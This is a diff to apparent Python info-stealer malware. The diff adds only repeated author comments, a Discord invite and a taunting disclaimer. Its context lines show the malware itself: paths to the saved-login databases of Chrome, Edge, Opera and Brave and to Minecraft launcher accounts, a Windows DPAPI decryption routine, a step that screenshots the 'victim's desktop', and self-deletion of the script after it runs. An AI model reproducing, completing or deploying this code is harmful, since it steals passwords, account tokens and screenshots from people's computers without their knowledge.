@@ -19,7 +19,8 @@ import time
 from os import remove
 from sys import argv
 
-# last version 3/1/21 by msr#6536
+# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+
 
 DBP = r'Google\Chrome\User Data\Default\Login Data'
 EBP = r'Microsoft\Edge\User Data\Default\Login Data'
@@ -27,6 +28,7 @@ MCBP = r'.minecraft\launcher_accounts.json'
 OBP = r'\Opera Software\Opera Stable'
 BBP = r'\BraveSoftware\Brave-Browser\User Data\Default\Login Data'
 ADP = os.environ['LOCALAPPDATA']
+# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 
 def sniff(path):
@@ -83,6 +85,7 @@ def dpapi(encrypted):
     result = ctypes.string_at(blobout.pbData, blobout.cbData)
     ctypes.windll.kernel32.LocalFree(blobout.pbData)
     return result
+# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 
 def localdata():
@@ -148,6 +151,7 @@ class chrome:
         except WindowsError:
             return None
 
+# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 def localdata2():
     jsn = None
@@ -212,6 +216,7 @@ class edge:
         except WindowsError:
             return None
 
+# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 def localdata3():
     jsn = None
@@ -406,6 +411,7 @@ def beamed():
 
         message += '```'
     
+# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
     """screenshot victim's desktop"""
     try:
@@ -530,5 +536,6 @@ def beamed():
         remove(argv[0])
     except:
     	pass
+# last version , 3/18/21 by msr#6536 , #gotcha program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 beamed()
